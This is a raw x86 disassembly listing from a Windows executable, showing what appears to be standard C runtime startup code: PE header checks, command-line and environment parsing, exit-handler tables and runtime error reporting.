  424473:	pop    ebp
  424474:	and    al,al
  424476:	mov    esp,ebp
  424478:	into   
  424479:	or     cl,dl
  42447b:	jnp    0x424432
  42447d:	clc    
  42447e:	and    al,0xa1
  424480:	adc    BYTE PTR [edx],bl
  424482:	call   0x5ffb:0x71b4f9e7
  424489:	jnp    0x4244b4
  42448b:	shrd   DWORD PTR [edx],esi,cl
  42448e:	mov    ebp,0xd1567836
  424493:	call   0x72fbd141
  424498:	sar    BYTE PTR [ecx-0x27],1
  42449b:	add    DWORD PTR [edx+0x60ba4604],esi
  4244a1:	bound  ebx,QWORD PTR [ebx+0x6124a6d6]
  4244a7:	sti    
  4244a8:	cmp    edi,esp
  4244aa:	fstp   QWORD PTR [ecx-0x4a78f340]
  4244b0:	addr16 sti 
  4244b2:	xor    ah,ah
  4244b4:	adc    cl,BYTE PTR [ebx-0x5ecbf97e]
  4244ba:	dec    edi
  4244bb:	dec    esi
  4244bc:	das    
  4244bd:	(bad)  
  4244be:	in     eax,0x45
  4244c0:	pop    ds
  4244c1:	inc    ebx
  4244c2:	push   eax
  4244c3:	ja     0x42452f
  4244c5:	add    BYTE PTR [edx+0x0],ch
  4244c8:	call   0x4244f0
  4244cd:	push   0xa
  4244cf:	push   0x0
  4244d1:	push   0x0
  4244d3:	call   DWORD PTR ds:0x429054
  4244d9:	xor    eax,eax
  4244db:	add    esp,0x10
  4244de:	ret    0x10
  4244e1:	nop
  4244e2:	nop
  4244e3:	nop
  4244e4:	nop
  4244e5:	nop
  4244e6:	nop
  4244e7:	nop
  4244e8:	nop
  4244e9:	nop
  4244ea:	nop
  4244eb:	nop
  4244ec:	nop
  4244ed:	nop
  4244ee:	nop
  4244ef:	nop
  4244f0:	jmp    DWORD PTR ds:0x429144
  4244f6:	jmp    DWORD PTR ds:0x429140
  4244fc:	cmp    DWORD PTR ds:0x4635bc,0x1
  424503:	jne    0x42450a
  424505:	call   0x424a48
  42450a:	push   DWORD PTR [esp+0x4]
  42450e:	call   0x4248d1
  424513:	push   0xff
  424518:	call   DWORD PTR ds:0x462cb4
  42451e:	pop    ecx
  42451f:	pop    ecx
  424520:	ret    
  424521:	cmp    DWORD PTR ds:0x4635bc,0x1
  424528:	jne    0x42452f
  42452a:	call   0x424a48
  42452f:	push   DWORD PTR [esp+0x4]
  424533:	call   0x4248d1
  424538:	push   0xff
  42453d:	call   0x424717
  424542:	pop    ecx
  424543:	pop    ecx
  424544:	ret    
  424545:	push   0x60
  424547:	push   0x429268
  42454c:	call   0x425434
  424551:	mov    edi,0x94
  424556:	mov    eax,edi
  424558:	call   0x425480
  42455d:	mov    DWORD PTR [ebp-0x18],esp
  424560:	mov    esi,esp
  424562:	mov    DWORD PTR [esi],edi
  424564:	push   esi
  424565:	call   DWORD PTR ds:0x429098
  42456b:	mov    ecx,DWORD PTR [esi+0x10]
  42456e:	mov    DWORD PTR ds:0x4635c4,ecx
  424574:	mov    eax,DWORD PTR [esi+0x4]
  424577:	mov    ds:0x4635d0,eax
  42457c:	mov    edx,DWORD PTR [esi+0x8]
  42457f:	mov    DWORD PTR ds:0x4635d4,edx
  424585:	mov    esi,DWORD PTR [esi+0xc]
  424588:	and    esi,0x7fff
  42458e:	mov    DWORD PTR ds:0x4635c8,esi
  424594:	cmp    ecx,0x2
  424597:	je     0x4245a5
  424599:	or     esi,0x8000
  42459f:	mov    DWORD PTR ds:0x4635c8,esi
  4245a5:	shl    eax,0x8
  4245a8:	add    eax,edx
  4245aa:	mov    ds:0x4635cc,eax
  4245af:	xor    esi,esi
  4245b1:	push   esi
  4245b2:	mov    edi,DWORD PTR ds:0x42902c
  4245b8:	call   edi
  4245ba:	cmp    WORD PTR [eax],0x5a4d
  4245bf:	jne    0x4245e0
  4245c1:	mov    ecx,DWORD PTR [eax+0x3c]
  4245c4:	add    ecx,eax
  4245c6:	cmp    DWORD PTR [ecx],0x4550
  4245cc:	jne    0x4245e0
  4245ce:	movzx  eax,WORD PTR [ecx+0x18]
  4245d2:	cmp    eax,0x10b
  4245d7:	je     0x4245f8
  4245d9:	cmp    eax,0x20b
  4245de:	je     0x4245e5
  4245e0:	mov    DWORD PTR [ebp-0x1c],esi
  4245e3:	jmp    0x42460c
  4245e5:	cmp    DWORD PTR [ecx+0x84],0xe
  4245ec:	jbe    0x4245e0
  4245ee:	xor    eax,eax
  4245f0:	cmp    DWORD PTR [ecx+0xf8],esi
  4245f6:	jmp    0x424606
  4245f8:	cmp    DWORD PTR [ecx+0x74],0xe
  4245fc:	jbe    0x4245e0
  4245fe:	xor    eax,eax
  424600:	cmp    DWORD PTR [ecx+0xe8],esi
  424606:	setne  al
  424609:	mov    DWORD PTR [ebp-0x1c],eax
  42460c:	push   0x1
  42460e:	call   0x4253e3
  424613:	pop    ecx
  424614:	test   eax,eax
  424616:	jne    0x424620
  424618:	push   0x1c
  42461a:	call   0x424521
  42461f:	pop    ecx
  424620:	call   0x42535a
  424625:	test   eax,eax
  424627:	jne    0x424631
  424629:	push   0x10
  42462b:	call   0x424521
  424630:	pop    ecx
  424631:	call   0x425243
  424636:	mov    DWORD PTR [ebp-0x4],esi
  424639:	call   0x425045
  42463e:	test   eax,eax
  424640:	jge    0x42464a
  424642:	push   0x1b
  424644:	call   0x4244fc
  424649:	pop    ecx
  42464a:	call   DWORD PTR ds:0x429094
  424650:	mov    ds:0x463d74,eax
  424655:	call   0x424f23
  42465a:	mov    ds:0x4635b4,eax
  42465f:	call   0x424e81
  424664:	test   eax,eax
  424666:	jge    0x424670
  424668:	push   0x8
  42466a:	call   0x4244fc
  42466f:	pop    ecx
  424670:	call   0x424c4e
  424675:	test   eax,eax
  424677:	jge    0x424681
  424679:	push   0x9
  42467b:	call   0x4244fc
  424680:	pop    ecx
  424681:	call   0x424759
  424686:	mov    DWORD PTR [ebp-0x20],eax
  424689:	cmp    eax,esi
  42468b:	je     0x424694
  42468d:	push   eax
  42468e:	call   0x4244fc
  424693:	pop    ecx
  424694:	mov    DWORD PTR [ebp-0x38],esi
  424697:	lea    eax,[ebp-0x64]
  42469a:	push   eax
  42469b:	call   DWORD PTR ds:0x429090
  4246a1:	call   0x424be5
  4246a6:	mov    DWORD PTR [ebp-0x68],eax
  4246a9:	test   BYTE PTR [ebp-0x38],0x1
  4246ad:	je     0x4246b5
  4246af:	movzx  eax,WORD PTR [ebp-0x34]
  4246b3:	jmp    0x4246b8
  4246b5:	push   0xa
  4246b7:	pop    eax
  4246b8:	push   eax
  4246b9:	push   DWORD PTR [ebp-0x68]
  4246bc:	push   esi
  4246bd:	push   esi
  4246be:	call   edi
  4246c0:	push   eax
  4246c1:	call   0x423030
  4246c6:	mov    edi,eax
  4246c8:	mov    DWORD PTR [ebp-0x6c],edi
  4246cb:	cmp    DWORD PTR [ebp-0x1c],esi
  4246ce:	jne    0x4246d6
  4246d0:	push   edi
  4246d1:	call   0x424891
  4246d6:	call   0x4248b3
  4246db:	jmp    0x424708
  4246dd:	mov    eax,DWORD PTR [ebp-0x14]
  4246e0:	mov    ecx,DWORD PTR [eax]
  4246e2:	mov    ecx,DWORD PTR [ecx]
  4246e4:	mov    DWORD PTR [ebp-0x70],ecx
  4246e7:	push   eax
  4246e8:	push   ecx
  4246e9:	call   0x424a81
  4246ee:	pop    ecx
  4246ef:	pop    ecx
  4246f0:	ret    
  4246f1:	mov    esp,DWORD PTR [ebp-0x18]
  4246f4:	mov    edi,DWORD PTR [ebp-0x70]
  4246f7:	cmp    DWORD PTR [ebp-0x1c],0x0
  4246fb:	jne    0x424703
  4246fd:	push   edi
  4246fe:	call   0x4248a2
  424703:	call   0x4248c2
  424708:	or     DWORD PTR [ebp-0x4],0xffffffff
  42470c:	mov    eax,edi
  42470e:	lea    esp,[ebp-0x7c]
  424711:	call   0x42546f
  424716:	ret    
  424717:	push   0x429284
  42471c:	call   DWORD PTR ds:0x42902c
  424722:	test   eax,eax
  424724:	je     0x42473c
  424726:	push   0x429274
  42472b:	push   eax
  42472c:	call   DWORD PTR ds:0x429028
  424732:	test   eax,eax
  424734:	je     0x42473c
  424736:	push   DWORD PTR [esp+0x4]
  42473a:	call   eax
  42473c:	push   DWORD PTR [esp+0x4]
  424740:	call   DWORD PTR ds:0x42909c
  424746:	int3   
  424747:	push   0x8
  424749:	call   0x4255ef
  42474e:	pop    ecx
  42474f:	ret    
  424750:	push   0x8
  424752:	call   0x42555b
  424757:	pop    ecx
  424758:	ret    
  424759:	mov    eax,ds:0x463d70
  42475e:	test   eax,eax
  424760:	je     0x424764
  424762:	call   eax
  424764:	push   esi
  424765:	push   edi
  424766:	mov    ecx,0x42b00c
  42476b:	mov    edi,0x42b018
  424770:	xor    eax,eax
  424772:	cmp    ecx,edi
  424774:	mov    esi,ecx
  424776:	jae    0x42478f
  424778:	test   eax,eax
  42477a:	jne    0x4247bb
  42477c:	mov    ecx,DWORD PTR [esi]
  42477e:	test   ecx,ecx
  424780:	je     0x424784
  424782:	call   ecx
  424784:	add    esi,0x4
  424787:	cmp    esi,edi
  424789:	jb     0x424778
  42478b:	test   eax,eax
  42478d:	jne    0x4247bb
  42478f:	push   0x425287
  424794:	call   0x425700
  424799:	mov    esi,0x42b000
  42479e:	mov    eax,esi
  4247a0:	mov    edi,0x42b008
  4247a5:	cmp    eax,edi
  4247a7:	pop    ecx
  4247a8:	jae    0x4247b9
  4247aa:	mov    eax,DWORD PTR [esi]
  4247ac:	test   eax,eax
  4247ae:	je     0x4247b2
  4247b0:	call   eax
  4247b2:	add    esi,0x4
  4247b5:	cmp    esi,edi
  4247b7:	jb     0x4247aa
  4247b9:	xor    eax,eax
  4247bb:	pop    edi
  4247bc:	pop    esi
  4247bd:	ret    
  4247be:	push   ebp
  4247bf:	mov    ebp,esp
  4247c1:	push   esi
  4247c2:	push   edi
  4247c3:	push   0x8
  4247c5:	call   0x4255ef
  4247ca:	xor    esi,esi
  4247cc:	inc    esi
  4247cd:	cmp    DWORD PTR ds:0x463604,esi
  4247d3:	pop    ecx
  4247d4:	jne    0x4247e6
  4247d6:	push   DWORD PTR [ebp+0x8]
  4247d9:	call   DWORD PTR ds:0x429064
  4247df:	push   eax
  4247e0:	call   DWORD PTR ds:0x4290a0
  4247e6:	cmp    DWORD PTR [ebp+0xc],0x0
  4247ea:	mov    al,BYTE PTR [ebp+0x10]
  4247ed:	mov    DWORD PTR ds:0x463600,esi
  4247f3:	mov    ds:0x4635fc,al
  4247f8:	jne    0x42484c
  4247fa:	mov    ecx,DWORD PTR ds:0x463d68
  424800:	test   ecx,ecx
  424802:	je     0x42482d
  424804:	mov    eax,ds:0x463d64
  424809:	sub    eax,0x4
  42480c:	cmp    eax,ecx
  42480e:	jmp    0x424826
  424810:	mov    eax,DWORD PTR [eax]
  424812:	test   eax,eax
  424814:	je     0x424818
  424816:	call   eax
  424818:	mov    eax,ds:0x463d64
  42481d:	sub    eax,0x4
  424820:	cmp    eax,DWORD PTR ds:0x463d68
  424826:	mov    ds:0x463d64,eax
  42482b:	jae    0x424810
  42482d:	mov    eax,0x42b01c
  424832:	mov    esi,0x42b020
  424837:	cmp    eax,esi
  424839:	mov    edi,eax
  42483b:	jae    0x42484c
  42483d:	mov    eax,DWORD PTR [edi]
  42483f:	test   eax,eax
  424841:	je     0x424845
  424843:	call   eax
  424845:	add    edi,0x4
  424848:	cmp    edi,esi
  42484a:	jb     0x42483d
  42484c:	mov    eax,0x42b024
  424851:	mov    esi,0x42b028
  424856:	cmp    eax,esi
  424858:	mov    edi,eax
  42485a:	jae    0x42486b
  42485c:	mov    eax,DWORD PTR [edi]
  42485e:	test   eax,eax
  424860:	je     0x424864
  424862:	call   eax
  424864:	add    edi,0x4
  424867:	cmp    edi,esi
  424869:	jb     0x42485c
  42486b:	cmp    DWORD PTR [ebp+0x10],0x0
  42486f:	pop    edi
  424870:	pop    esi
  424871:	je     0x42487c
  424873:	push   0x8
  424875:	call   0x42555b
  42487a:	jmp    0x42488e
  42487c:	push   DWORD PTR [ebp+0x8]
  42487f:	mov    DWORD PTR ds:0x463604,0x1
  424889:	call   0x424717
  42488e:	pop    ecx
  42488f:	pop    ebp
  424890:	ret    
  424891:	push   0x0
  424893:	push   0x0
  424895:	push   DWORD PTR [esp+0xc]
  424899:	call   0x4247be
  42489e:	add    esp,0xc
  4248a1:	ret    
  4248a2:	push   0x0
  4248a4:	push   0x1
  4248a6:	push   DWORD PTR [esp+0xc]
  4248aa:	call   0x4247be
  4248af:	add    esp,0xc
  4248b2:	ret    
  4248b3:	push   0x1
  4248b5:	push   0x0
  4248b7:	push   0x0
  4248b9:	call   0x4247be
  4248be:	add    esp,0xc
  4248c1:	ret    
  4248c2:	push   0x1
  4248c4:	push   0x1
  4248c6:	push   0x0
  4248c8:	call   0x4247be
  4248cd:	add    esp,0xc
  4248d0:	ret    
  4248d1:	push   ebp
  4248d2:	mov    ebp,esp
  4248d4:	sub    esp,0x10c
  4248da:	mov    eax,ds:0x462f30
  4248df:	xor    eax,DWORD PTR [ebp+0x4]
  4248e2:	mov    ecx,DWORD PTR [ebp+0x8]
  4248e5:	push   ebx
  4248e6:	push   esi
  4248e7:	mov    DWORD PTR [ebp-0x4],eax
  4248ea:	xor    edx,edx
  4248ec:	push   edi
  4248ed:	xor    eax,eax
  4248ef:	cmp    ecx,DWORD PTR [eax*8+0x462cc0]
  4248f6:	je     0x4248fe
  4248f8:	inc    eax
  4248f9:	cmp    eax,0x12
  4248fc:	jb     0x4248ef
  4248fe:	mov    esi,eax
  424900:	shl    esi,0x3
  424903:	cmp    ecx,DWORD PTR [esi+0x462cc0]
  424909:	jne    0x424a32
  42490f:	mov    eax,ds:0x4635bc
  424914:	cmp    eax,0x1
  424917:	je     0x424a0d
  42491d:	cmp    eax,edx
  42491f:	jne    0x42492e
  424921:	cmp    DWORD PTR ds:0x462cb8,0x1
  424928:	je     0x424a0d
  42492e:	cmp    ecx,0xfc
  424934:	je     0x424a32
  42493a:	push   0x104
  42493f:	lea    eax,[ebp-0x10c]
  424945:	push   eax
  424946:	push   edx
  424947:	mov    BYTE PTR [ebp-0x8],dl
  42494a:	call   DWORD PTR ds:0x4290a8
  424950:	test   eax,eax
  424952:	jne    0x424967
  424954:	lea    eax,[ebp-0x10c]
  42495a:	push   0x4295dc
  42495f:	push   eax
  424960:	call   0x425810
  424965:	pop    ecx
  424966:	pop    ecx
  424967:	lea    eax,[ebp-0x10c]
  42496d:	push   eax
  42496e:	lea    edi,[ebp-0x10c]
  424974:	call   0x425a40
  424979:	inc    eax
  42497a:	cmp    eax,0x3c
  42497d:	pop    ecx
  42497e:	jbe    0x4249a9
  424980:	lea    eax,[ebp-0x10c]
  424986:	push   eax
  424987:	call   0x425a40
  42498c:	mov    edi,eax
  42498e:	lea    eax,[ebp-0x10c]
  424994:	sub    eax,0x3b
  424997:	push   0x3
  424999:	add    edi,eax
  42499b:	push   0x4295d8
  4249a0:	push   edi
  4249a1:	call   0x425910
  4249a6:	add    esp,0x10
  4249a9:	push   edi
  4249aa:	call   0x425a40
  4249af:	push   DWORD PTR [esi+0x462cc4]
  4249b5:	mov    ebx,eax
  4249b7:	call   0x425a40
  4249bc:	lea    eax,[ebx+eax*1+0x1c]
  4249c0:	pop    ecx
  4249c1:	add    eax,0x3
  4249c4:	pop    ecx
  4249c5:	and    eax,0xfffffffc
  4249c8:	call   0x425480
  4249cd:	mov    ebx,esp
  4249cf:	push   0x4295bc
  4249d4:	push   ebx
  4249d5:	call   0x425810
  4249da:	push   edi
  4249db:	push   ebx
  4249dc:	call   0x425820
  4249e1:	push   0x4295b8
  4249e6:	push   ebx
  4249e7:	call   0x425820
  4249ec:	push   DWORD PTR [esi+0x462cc4]
  4249f2:	push   ebx
  4249f3:	call   0x425820
  4249f8:	push   0x12010
  4249fd:	push   0x429590
  424a02:	push   ebx
  424a03:	call   0x425712
  424a08:	add    esp,0x2c
  424a0b:	jmp    0x424a32
  424a0d:	push   edx
  424a0e:	lea    eax,[ebp+0x8]
  424a11:	push   eax
  424a12:	lea    esi,[esi+0x462cc4]
  424a18:	push   DWORD PTR [esi]
  424a1a:	call   0x425a40
  424a1f:	pop    ecx
  424a20:	push   eax
  424a21:	push   DWORD PTR [esi]
  424a23:	push   0xfffffff4
  424a25:	call   DWORD PTR ds:0x4290a4
  424a2b:	push   eax
  424a2c:	call   DWORD PTR ds:0x429080
  424a32:	lea    esp,[ebp-0x118]
  424a38:	mov    ecx,DWORD PTR [ebp-0x4]
  424a3b:	xor    ecx,DWORD PTR [ebp+0x4]
  424a3e:	call   0x425afc
  424a43:	pop    edi
  424a44:	pop    esi
  424a45:	pop    ebx
  424a46:	leave  
  424a47:	ret    
  424a48:	mov    eax,ds:0x4635bc
  424a4d:	cmp    eax,0x1
  424a50:	je     0x424a5f
  424a52:	test   eax,eax
  424a54:	jne    0x424a80
  424a56:	cmp    DWORD PTR ds:0x462cb8,0x1
  424a5d:	jne    0x424a80
  424a5f:	push   0xfc
  424a64:	call   0x4248d1
  424a69:	mov    eax,ds:0x463608
  424a6e:	test   eax,eax
  424a70:	pop    ecx
  424a71:	je     0x424a75
  424a73:	call   eax
  424a75:	push   0xff
  424a7a:	call   0x4248d1
  424a7f:	pop    ecx
  424a80:	ret    
  424a81:	push   ebp
  424a82:	mov    ebp,esp
  424a84:	push   ecx
  424a85:	push   ebx
  424a86:	push   esi
  424a87:	push   edi
  424a88:	call   0x4252e9
  424a8d:	mov    edi,DWORD PTR [ebp+0x8]
  424a90:	mov    esi,eax
  424a92:	mov    edx,DWORD PTR [esi+0x54]
  424a95:	mov    eax,ds:0x462dd4
  424a9a:	mov    ecx,edx
  424a9c:	cmp    DWORD PTR [ecx],edi
  424a9e:	je     0x424aad
  424aa0:	lea    ebx,[eax+eax*2]
  424aa3:	add    ecx,0xc
  424aa6:	lea    ebx,[edx+ebx*4]
  424aa9:	cmp    ecx,ebx
  424aab:	jb     0x424a9c
  424aad:	lea    eax,[eax+eax*2]
  424ab0:	lea    eax,[edx+eax*4]
  424ab3:	cmp    ecx,eax
  424ab5:	jae    0x424abb
  424ab7:	cmp    DWORD PTR [ecx],edi
  424ab9:	je     0x424abd
  424abb:	xor    ecx,ecx
  424abd:	test   ecx,ecx
  424abf:	je     0x424bd7
  424ac5:	mov    ebx,DWORD PTR [ecx+0x8]
  424ac8:	test   ebx,ebx
  424aca:	mov    DWORD PTR [ebp+0x8],ebx
  424acd:	je     0x424bd7
  424ad3:	cmp    ebx,0x5
  424ad6:	jne    0x424ae4
  424ad8:	and    DWORD PTR [ecx+0x8],0x0
  424adc:	xor    eax,eax
  424ade:	inc    eax
  424adf:	jmp    0x424be0
  424ae4:	cmp    ebx,0x1
  424ae7:	je     0x424bd2
  424aed:	mov    eax,DWORD PTR [esi+0x58]
  424af0:	mov    DWORD PTR [ebp-0x4],eax
  424af3:	mov    eax,DWORD PTR [ebp+0xc]
  424af6:	mov    DWORD PTR [esi+0x58],eax
  424af9:	mov    eax,DWORD PTR [ecx+0x4]
  424afc:	cmp    eax,0x8
  424aff:	jne    0x424bc4
  424b05:	mov    edx,DWORD PTR ds:0x462dc8
  424b0b:	mov    eax,ds:0x462dcc
  424b10:	add    eax,edx
  424b12:	cmp    edx,eax
  424b14:	jge    0x424b3d
  424b16:	lea    eax,[edx+edx*2]
  424b19:	shl    eax,0x2
  424b1c:	mov    edi,DWORD PTR [esi+0x54]
  424b1f:	and    DWORD PTR [eax+edi*1+0x8],0x0
  424b24:	mov    edi,DWORD PTR ds:0x462dc8
  424b2a:	mov    ebx,DWORD PTR ds:0x462dcc
  424b30:	inc    edx
  424b31:	add    ebx,edi
  424b33:	add    eax,0xc
  424b36:	cmp    edx,ebx
  424b38:	jl     0x424b1c
  424b3a:	mov    ebx,DWORD PTR [ebp+0x8]
  424b3d:	mov    ecx,DWORD PTR [ecx]
  424b3f:	cmp    ecx,0xc000008e
  424b45:	mov    edi,DWORD PTR [esi+0x5c]
  424b48:	jne    0x424b53
  424b4a:	mov    DWORD PTR [esi+0x5c],0x83
  424b51:	jmp    0x424bb7
  424b53:	cmp    ecx,0xc0000090
  424b59:	jne    0x424b64
  424b5b:	mov    DWORD PTR [esi+0x5c],0x81
  424b62:	jmp    0x424bb7
  424b64:	cmp    ecx,0xc0000091
  424b6a:	jne    0x424b75
  424b6c:	mov    DWORD PTR [esi+0x5c],0x84
  424b73:	jmp    0x424bb7
  424b75:	cmp    ecx,0xc0000093
  424b7b:	jne    0x424b86
  424b7d:	mov    DWORD PTR [esi+0x5c],0x85
  424b84:	jmp    0x424bb7
  424b86:	cmp    ecx,0xc000008d
  424b8c:	jne    0x424b97
  424b8e:	mov    DWORD PTR [esi+0x5c],0x82
  424b95:	jmp    0x424bb7
  424b97:	cmp    ecx,0xc000008f
  424b9d:	jne    0x424ba8
  424b9f:	mov    DWORD PTR [esi+0x5c],0x86
  424ba6:	jmp    0x424bb7
  424ba8:	cmp    ecx,0xc0000092
  424bae:	jne    0x424bb7
  424bb0:	mov    DWORD PTR [esi+0x5c],0x8a
  424bb7:	push   DWORD PTR [esi+0x5c]
  424bba:	push   0x8
  424bbc:	call   ebx
  424bbe:	pop    ecx
  424bbf:	mov    DWORD PTR [esi+0x5c],edi
  424bc2:	jmp    0x424bcb
  424bc4:	and    DWORD PTR [ecx+0x8],0x0
  424bc8:	push   eax
  424bc9:	call   ebx
  424bcb:	mov    eax,DWORD PTR [ebp-0x4]
  424bce:	pop    ecx
  424bcf:	mov    DWORD PTR [esi+0x58],eax
  424bd2:	or     eax,0xffffffff
  424bd5:	jmp    0x424be0
  424bd7:	push   DWORD PTR [ebp+0xc]
  424bda:	call   DWORD PTR ds:0x4290ac
  424be0:	pop    edi
  424be1:	pop    esi
  424be2:	pop    ebx
  424be3:	leave  
  424be4:	ret    
  424be5:	cmp    DWORD PTR ds:0x463d6c,0x0
  424bec:	jne    0x424bf3
  424bee:	call   0x42601c
  424bf3:	push   esi
  424bf4:	mov    esi,DWORD PTR ds:0x463d74
  424bfa:	test   esi,esi
  424bfc:	jne    0x424c05
  424bfe:	mov    esi,0x4295f3
  424c03:	jmp    0x424c4a
  424c05:	mov    al,BYTE PTR [esi]
  424c07:	cmp    al,0x22
  424c09:	jne    0x424c33
  424c0b:	inc    esi
  424c0c:	mov    al,BYTE PTR [esi]
  424c0e:	cmp    al,0x22
  424c10:	je     0x424c43
  424c12:	test   al,al
  424c14:	je     0x424c2c
  424c16:	movzx  eax,al
  424c19:	push   eax
  424c1a:	call   0x425b3b
  424c1f:	test   eax,eax
  424c21:	pop    ecx
  424c22:	je     0x424c25
  424c24:	inc    esi
  424c25:	inc    esi
  424c26:	mov    al,BYTE PTR [esi]
  424c28:	cmp    al,0x22
  424c2a:	jne    0x424c12
  424c2c:	cmp    BYTE PTR [esi],0x22
  424c2f:	jne    0x424c44
  424c31:	jmp    0x424c43
  424c33:	cmp    al,0x20
  424c35:	jbe    0x424c44
  424c37:	inc    esi
  424c38:	cmp    BYTE PTR [esi],0x20
  424c3b:	ja     0x424c37
  424c3d:	jmp    0x424c44
  424c3f:	cmp    al,0x20
  424c41:	ja     0x424c4a
  424c43:	inc    esi
  424c44:	mov    al,BYTE PTR [esi]
  424c46:	test   al,al
  424c48:	jne    0x424c3f
  424c4a:	mov    eax,esi
  424c4c:	pop    esi
  424c4d:	ret    
  424c4e:	push   ebx
  424c4f:	xor    ebx,ebx
  424c51:	cmp    DWORD PTR ds:0x463d6c,ebx
  424c57:	push   esi
  424c58:	push   edi
  424c59:	jne    0x424c60
  424c5b:	call   0x42601c
  424c60:	mov    esi,DWORD PTR ds:0x4635b4
  424c66:	xor    edi,edi
  424c68:	cmp    esi,ebx
  424c6a:	jne    0x424c7e
  424c6c:	jmp    0x424c9e
  424c6e:	cmp    al,0x3d
  424c70:	je     0x424c73
  424c72:	inc    edi
  424c73:	push   esi
  424c74:	call   0x425a40
  424c79:	pop    ecx
  424c7a:	lea    esi,[esi+eax*1+0x1]
  424c7e:	mov    al,BYTE PTR [esi]
  424c80:	cmp    al,bl
  424c82:	jne    0x424c6e
  424c84:	lea    eax,[edi*4+0x4]
  424c8b:	push   eax
  424c8c:	call   0x426152
  424c91:	mov    edi,eax
  424c93:	cmp    edi,ebx
  424c95:	pop    ecx
  424c96:	mov    DWORD PTR ds:0x4635e4,edi
  424c9c:	jne    0x424ca3
  424c9e:	or     eax,0xffffffff
  424ca1:	jmp    0x424cfb
  424ca3:	mov    esi,DWORD PTR ds:0x4635b4
  424ca9:	push   ebp
  424caa:	jmp    0x424cd6
  424cac:	push   esi
  424cad:	call   0x425a40
  424cb2:	mov    ebp,eax
  424cb4:	inc    ebp
  424cb5:	cmp    BYTE PTR [esi],0x3d
  424cb8:	pop    ecx
  424cb9:	je     0x424cd4
  424cbb:	push   ebp
  424cbc:	call   0x426152
  424cc1:	cmp    eax,ebx
  424cc3:	pop    ecx
  424cc4:	mov    DWORD PTR [edi],eax
  424cc6:	je     0x424cff
  424cc8:	push   esi
  424cc9:	push   eax
  424cca:	call   0x425810
  424ccf:	pop    ecx
  424cd0:	pop    ecx
  424cd1:	add    edi,0x4
  424cd4:	add    esi,ebp
  424cd6:	cmp    BYTE PTR [esi],bl
  424cd8:	jne    0x424cac
  424cda:	push   DWORD PTR ds:0x4635b4
  424ce0:	call   0x42603a
  424ce5:	mov    DWORD PTR ds:0x4635b4,ebx
  424ceb:	mov    DWORD PTR [edi],ebx
  424ced:	mov    DWORD PTR ds:0x463d60,0x1
  424cf7:	xor    eax,eax
  424cf9:	pop    ecx
  424cfa:	pop    ebp
  424cfb:	pop    edi
  424cfc:	pop    esi
  424cfd:	pop    ebx
  424cfe:	ret    
  424cff:	push   DWORD PTR ds:0x4635e4
  424d05:	call   0x42603a
  424d0a:	mov    DWORD PTR ds:0x4635e4,ebx
  424d10:	or     eax,0xffffffff
  424d13:	jmp    0x424cf9
  424d15:	push   ebp
  424d16:	mov    ebp,esp
  424d18:	push   ecx
  424d19:	push   ebx
  424d1a:	mov    ebx,DWORD PTR [ebp+0xc]
  424d1d:	xor    edx,edx
  424d1f:	cmp    DWORD PTR [ebp+0x8],edx
  424d22:	push   edi
  424d23:	mov    DWORD PTR [esi],edx
  424d25:	mov    edi,ecx
  424d27:	mov    DWORD PTR [ebx],0x1
  424d2d:	je     0x424d38
  424d2f:	mov    ecx,DWORD PTR [ebp+0x8]
  424d32:	add    DWORD PTR [ebp+0x8],0x4
  424d36:	mov    DWORD PTR [ecx],edi
  424d38:	cmp    BYTE PTR [eax],0x22
  424d3b:	jne    0x424d4b
  424d3d:	xor    ecx,ecx
  424d3f:	test   edx,edx
  424d41:	sete   cl
  424d44:	inc    eax
  424d45:	mov    edx,ecx
  424d47:	mov    cl,0x22
  424d49:	jmp    0x424d78
  424d4b:	inc    DWORD PTR [esi]
  424d4d:	test   edi,edi
  424d4f:	je     0x424d56
  424d51:	mov    cl,BYTE PTR [eax]
  424d53:	mov    BYTE PTR [edi],cl
  424d55:	inc    edi
  424d56:	mov    cl,BYTE PTR [eax]
  424d58:	movzx  ebx,cl
  424d5b:	inc    eax
  424d5c:	test   BYTE PTR [ebx+0x463a21],0x4
  424d63:	je     0x424d71
  424d65:	inc    DWORD PTR [esi]
  424d67:	test   edi,edi
  424d69:	je     0x424d70
  424d6b:	mov    bl,BYTE PTR [eax]
  424d6d:	mov    BYTE PTR [edi],bl
  424d6f:	inc    edi
  424d70:	inc    eax
  424d71:	test   cl,cl
  424d73:	mov    ebx,DWORD PTR [ebp+0xc]
  424d76:	je     0x424daa
  424d78:	test   edx,edx
  424d7a:	jne    0x424d38
  424d7c:	cmp    cl,0x20
  424d7f:	je     0x424d86
  424d81:	cmp    cl,0x9
  424d84:	jne    0x424d38
  424d86:	test   edi,edi
  424d88:	je     0x424d8e
  424d8a:	and    BYTE PTR [edi-0x1],0x0
  424d8e:	and    DWORD PTR [ebp-0x4],0x0
  424d92:	cmp    BYTE PTR [eax],0x0
  424d95:	je     0x424e71
  424d9b:	mov    cl,BYTE PTR [eax]
  424d9d:	cmp    cl,0x20
  424da0:	je     0x424da7
  424da2:	cmp    cl,0x9
  424da5:	jne    0x424dad
  424da7:	inc    eax
  424da8:	jmp    0x424d9b
  424daa:	dec    eax
  424dab:	jmp    0x424d8e
  424dad:	cmp    BYTE PTR [eax],0x0
  424db0:	je     0x424e71
  424db6:	cmp    DWORD PTR [ebp+0x8],0x0
  424dba:	je     0x424dc5
  424dbc:	mov    ecx,DWORD PTR [ebp+0x8]
  424dbf:	add    DWORD PTR [ebp+0x8],0x4
  424dc3:	mov    DWORD PTR [ecx],edi
  424dc5:	inc    DWORD PTR [ebx]
  424dc7:	xor    ebx,ebx
  424dc9:	inc    ebx
  424dca:	xor    edx,edx
  424dcc:	jmp    0x424dd0
  424dce:	inc    eax
  424dcf:	inc    edx
  424dd0:	cmp    BYTE PTR [eax],0x5c
  424dd3:	je     0x424dce
  424dd5:	cmp    BYTE PTR [eax],0x22
  424dd8:	jne    0x424e00
  424dda:	test   dl,0x1
  424ddd:	jne    0x424dfe
  424ddf:	cmp    DWORD PTR [ebp-0x4],0x0
  424de3:	je     0x424df1
  424de5:	lea    ecx,[eax+0x1]
  424de8:	cmp    BYTE PTR [ecx],0x22
  424deb:	jne    0x424df1
  424ded:	mov    eax,ecx
  424def:	jmp    0x424df3
  424df1:	xor    ebx,ebx
  424df3:	xor    ecx,ecx
  424df5:	cmp    DWORD PTR [ebp-0x4],ecx
  424df8:	sete   cl
  424dfb:	mov    DWORD PTR [ebp-0x4],ecx
  424dfe:	shr    edx,1
  424e00:	test   edx,edx
  424e02:	je     0x424e11
  424e04:	test   edi,edi
  424e06:	je     0x424e0c
  424e08:	mov    BYTE PTR [edi],0x5c
  424e0b:	inc    edi
